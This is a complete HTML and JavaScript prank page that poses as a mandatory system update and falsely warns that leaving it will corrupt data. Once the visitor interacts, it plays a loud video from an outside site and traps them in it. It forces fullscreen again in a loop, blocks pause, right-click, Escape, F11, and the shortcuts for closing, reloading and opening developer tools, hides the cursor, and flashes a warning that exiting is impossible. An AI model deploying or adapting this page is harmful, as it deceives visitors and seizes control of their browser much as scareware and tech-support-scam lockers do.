<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Updating…</title>
<link rel="preload" as="video" href="https://mrit.lol/FunnyPakistaniboysingsdespacito.mp4" type="video/mp4">
<style>
body{
  margin:0;
  font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
  background:#0b0f16;
  color:#e6edf3;
  min-height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  padding:24px;
  cursor: default;
}
.box{
  width:min(560px, 100%);
  background:#111827;
  border:1px solid rgba(255,255,255,0.08);
  border-radius:16px;
  padding:22px;
  text-align:center;
  box-shadow:0 20px 60px rgba(0,0,0,.5);
}
h1{margin:0;font-size:18px;font-weight:800}
p{margin:10px 0 0;color:#cbd5e1;font-size:14px;line-height:1.45}
.prompt{display:none;margin-top:16px}
.btn{
  display:inline-block;
  padding:10px 14px;
  border-radius:10px;
  background:rgba(255,255,255,.12);
  color:#fff;
  text-decoration:none;
  font-weight:800;
  cursor:pointer;
  border:1px solid rgba(255,255,255,.12);
  user-select:none;
}
video{
  display:none;
  width:min(960px, 100%);
  height:auto;
  background:#000;
  border-radius:12px;
  box-shadow:0 20px 60px rgba(0,0,0,.5);
}
video::-webkit-media-controls { display: none !important; }
video::-webkit-media-controls-enclosure { display: none !important; }

/* Fullscreen overlay */
#fullscreenOverlay {
  display:none;
  position: fixed;
  top: 0;
  left: 0;
  width: 100vw;
  height: 100vh;
  z-index: 9999;
  pointer-events: auto;
  background: rgba(0,0,0,0);
  cursor: default;
}

/* Tooltip warning */
#fullscreenTooltip {
  position: fixed;
  bottom: 20px;
  left: 50%;
  transform: translateX(-50%);
  background: rgba(255, 69, 0, 0.85);
  color: white;
  padding: 8px 14px;
  border-radius: 8px;
  font-size: 14px;
  font-weight: 600;
  pointer-events: none;
  opacity: 0;
  transition: opacity 0.3s ease;
  z-index: 10000;
}
#fullscreenTooltip.show { opacity: 1; }

/* Shake animations */
@keyframes shake-small {0% {transform:translateX(-50%) translateX(0);}20% {transform:translateX(-50%) translateX(-4px);}40% {transform:translateX(-50%) translateX(4px);}60% {transform:translateX(-50%) translateX(-2px);}80% {transform:translateX(-50%) translateX(2px);}100% {transform:translateX(-50%) translateX(0);}}
@keyframes shake-medium {0% {transform:translateX(-50%) translateX(0);}20% {transform:translateX(-50%) translateX(-8px);}40% {transform:translateX(-50%) translateX(8px);}60% {transform:translateX(-50%) translateX(-6px);}80% {transform:translateX(-50%) translateX(6px);}100% {transform:translateX(-50%) translateX(0);}}
@keyframes shake-large {0% {transform:translateX(-50%) translateX(0);}20% {transform:translateX(-50%) translateX(-12px);}40% {transform:translateX(-50%) translateX(12px);}60% {transform:translateX(-50%) translateX(-10px);}80% {transform:translateX(-50%) translateX(10px);}100% {transform:translateX(-50%) translateX(0);}}
#fullscreenTooltip.shake-small { animation: shake-small 0.4s; }
#fullscreenTooltip.shake-medium { animation: shake-medium 0.35s; }
#fullscreenTooltip.shake-large { animation: shake-large 0.3s; }

/* Flashing red effect */
@keyframes flash-red {
  0%,50%,100% { background: rgba(255, 69, 0, 0.85); }
  25%,75% { background: rgba(255, 0, 0, 0.95); }
}
#fullscreenTooltip.flash { animation: flash-red 0.15s infinite alternate; }
</style>
</head>
<body>
<div class="box" id="loadingUI">
  <h1>Updating.</h1>
  <p id="status">Please wait, exiting this can cause data corruption, this update is mandatory.</p>
  <div class="prompt" id="prompt">
    <a class="btn" id="clickContinue" href="javascript:void(0)">Click to continue update, it is mandatory.</a>
  </div>
</div>

<video id="vid" loop playsinline muted controlslist="nodownload nofullscreen noremoteplayback" disablepictureinpicture disableremoteplayback>
  <source id="src" src="https://mrit.lol/FunnyPakistaniboysingsdespacito.mp4" type="video/mp4">
</video>

<div id="fullscreenOverlay"></div>
<div id="fullscreenTooltip">⚠️ Fullscreen is mandatory. You cannot exit this video.</div>

<script>
const PROMPT_AFTER_MS = 5000;
const vid = document.getElementById("vid");
const loadingUI = document.getElementById("loadingUI");
const prompt = document.getElementById("prompt");
const clickContinue = document.getElementById("clickContinue");
const overlay = document.getElementById("fullscreenOverlay");
const tooltip = document.getElementById("fullscreenTooltip");

let started = false;
let isInFullscreen = false;
let userInitiatedFullscreen = false;
let preventPause = true;
let spamCount = 0;
let spamTimeout;

// =========================
// Anti-pause
// =========================
function preventVideoPause(e){
  if(!started||!preventPause) return;
  if(e.code==='Space'||e.key===' '||e.keyCode===32){ e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation(); return false;}
  if(e.key==='k'||e.key==='K'){ e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation(); return false;}
}
function preventContextMenu(e){ if(started&&preventPause){ e.preventDefault(); e.stopPropagation(); return false; }}
function ensureVideoPlaying(){ if(!started||!preventPause) return; if(vid.paused&&!vid.ended){ vid.play().catch(()=>{setTimeout(()=>{ if(vid.paused&&!vid.ended) vid.play().catch(()=>{}); },50); }); }}
function setupPlaybackMonitor(){ vid.addEventListener('pause',()=>{ if(preventPause){ setTimeout(()=>{ if(vid.paused&&!vid.ended) vid.play().catch(()=>{}); },5); } }); setInterval(ensureVideoPlaying,250); }

// =========================
// Fullscreen
// =========================
function updateFullscreenState(){ const wasFullscreen=isInFullscreen; isInFullscreen=!!(document.fullscreenElement||document.webkitFullscreenElement||document.mozFullScreenElement||document.msFullscreenElement); if(started)document.body.style.cursor='none'; if(wasFullscreen&&!isInFullscreen) userInitiatedFullscreen=false;}
document.addEventListener('fullscreenchange',updateFullscreenState);
document.addEventListener('webkitfullscreenchange',updateFullscreenState);
document.addEventListener('mozfullscreenchange',updateFullscreenState);
document.addEventListener('MSFullscreenChange',updateFullscreenState);

function enterFullscreen(){ if(isInFullscreen)return; userInitiatedFullscreen=true; if(vid.requestFullscreen) vid.requestFullscreen().catch(()=>{userInitiatedFullscreen=false;}); else if(vid.webkitRequestFullscreen) vid.webkitRequestFullscreen().catch(()=>{userInitiatedFullscreen=false;}); else if(vid.mozRequestFullScreen) vid.mozRequestFullScreen().catch(()=>{userInitiatedFullscreen=false;}); else if(vid.msRequestFullscreen) vid.msRequestFullscreen().catch(()=>{userInitiatedFullscreen=false;}); }
function attemptReEnterFullscreen(){ if(!started)return; if(!isInFullscreen) enterFullscreen(); }

// =========================
// Tooltip & Shake + Flash
// =========================
function showFullscreenTooltip(){
  tooltip.classList.add('show');
  tooltip.classList.remove('shake-small','shake-medium','shake-large','flash');
  void tooltip.offsetWidth; // reflow

  // Determine shake + flash
  if(spamCount<3) tooltip.classList.add('shake-small');
  else if(spamCount<6) tooltip.classList.add('shake-medium');
  else tooltip.classList.add('shake-large','flash'); // high spam: shake + flash

  clearTimeout(overlay.tooltipTimeout);
  overlay.tooltipTimeout=setTimeout(()=>{
    tooltip.classList.remove('show','shake-small','shake-medium','shake-large','flash');
  },2000);

  // Increment spam count
  spamCount++;
  clearTimeout(spamTimeout);
  spamTimeout = setTimeout(()=>{ spamCount=Math.max(spamCount-1,0); },1500);
}

// =========================
// Fullscreen enforcement loop
// =========================
function enforceFullscreenLoop(){ if(!started)return; if(!isInFullscreen){ showFullscreenTooltip(); enterFullscreen(); } requestAnimationFrame(enforceFullscreenLoop); }

// =========================
// Adaptive preload
// =========================
function getNetworkProfile(){ const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection; if(!c)return{mode:"aggressive",reason:"no-api"}; const saveData=!!c.saveData; const type=(c.effectiveType||"").toLowerCase(); if(saveData)return{mode:"conservative",reason:"save-data",type}; if(type==="slow-2g"||type==="2g")return{mode:"conservative",reason:"very-slow",type}; return{mode:"aggressive",reason:"default-aggressive",type}; }
function applyPreloadPolicy(profile){ if(profile.mode==="conservative"){ vid.preload="metadata"; return {warmup:false};} vid.preload="auto"; return {warmup:true}; }
function kickOffFetch(){ try{vid.load();}catch(_){}
}
async function warmupMuted(){ try{ vid.muted=true; const p=vid.play(); if(p&&typeof p.then==="function"){ await p; vid.pause(); try{vid.currentTime=0;}catch(_){}}}catch(_){}
}
const profile=getNetworkProfile();
const {warmup}=applyPreloadPolicy(profile);
kickOffFetch();
if(warmup) warmupMuted();
const conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
if(conn&&typeof conn.addEventListener==="function"){ conn.addEventListener("change",()=>{ if(started)return; const p2=getNetworkProfile(); const w2=applyPreloadPolicy(p2).warmup; kickOffFetch(); if(w2) warmupMuted();});}

// Show fallback prompt
setTimeout(()=>{ if(!started) prompt.style.display="block"; },PROMPT_AFTER_MS);

// =========================
// Start
// =========================
function start(e){
  if(started)return;
  started=true;
  if(e?.type==="keydown"&&(e.code==="Space"||e.key===" ")) e.preventDefault();

  loadingUI.remove();
  vid.style.display="block";
  overlay.style.display="block";
  document.body.style.cursor='none';

  setupPlaybackMonitor();
  window.addEventListener('keydown', preventVideoPause,true);
  window.addEventListener('keyup', preventVideoPause,true);
  window.addEventListener('keypress', preventVideoPause,true);
  vid.addEventListener('contextmenu', preventContextMenu,true);
  document.addEventListener('contextmenu', preventContextMenu,true);
  document.addEventListener('mousemove',()=>document.body.style.cursor='none');
  vid.removeAttribute('controls');

  vid.muted=false;
  vid.volume=1;
  vid.play().then(()=>{ ensureVideoPlaying(); }).catch(()=>{});

  enterFullscreen();
  window.addEventListener("keydown", attemptReEnterFullscreen,true);
  window.addEventListener("pointerdown", attemptReEnterFullscreen,true);
  window.addEventListener("click", attemptReEnterFullscreen,true);

  enforceFullscreenLoop();
}

// =========================
// Overlay & tooltip handlers
// =========================
overlay.addEventListener("click",(e)=>{ e.preventDefault(); e.stopPropagation(); showFullscreenTooltip(); attemptReEnterFullscreen(); });
overlay.addEventListener("contextmenu",(e)=>{ e.preventDefault(); e.stopPropagation(); showFullscreenTooltip(); attemptReEnterFullscreen(); });
overlay.addEventListener("pointerdown",(e)=>{ e.preventDefault(); e.stopPropagation(); });
overlay.addEventListener("pointerup",(e)=>{ e.preventDefault(); e.stopPropagation(); });
overlay.addEventListener("dblclick",(e)=>{ e.preventDefault(); e.stopPropagation(); });
overlay.addEventListener('mousemove',()=>{ showFullscreenTooltip(); });

// Block ESC, F11, Ctrl/Cmd
window.addEventListener('keydown',function(e){
  if(!started)return;
  if(e.key==='Escape'||e.key==='F11'){ e.preventDefault(); e.stopPropagation(); showFullscreenTooltip(); attemptReEnterFullscreen(); }
  if((e.ctrlKey||e.metaKey)&&(e.key==='w'||e.key==='W'||e.key==='r'||e.key==='R'||(e.shiftKey&&(e.key==='I'||e.key==='i')))){ e.preventDefault(); e.stopPropagation(); showFullscreenTooltip(); }
},true);

// Initial listeners
window.addEventListener("keydown",start,true);
window.addEventListener("pointerdown",start,true);
clickContinue.addEventListener("click",start);

updateFullscreenState();
</script>
</body>
</html>
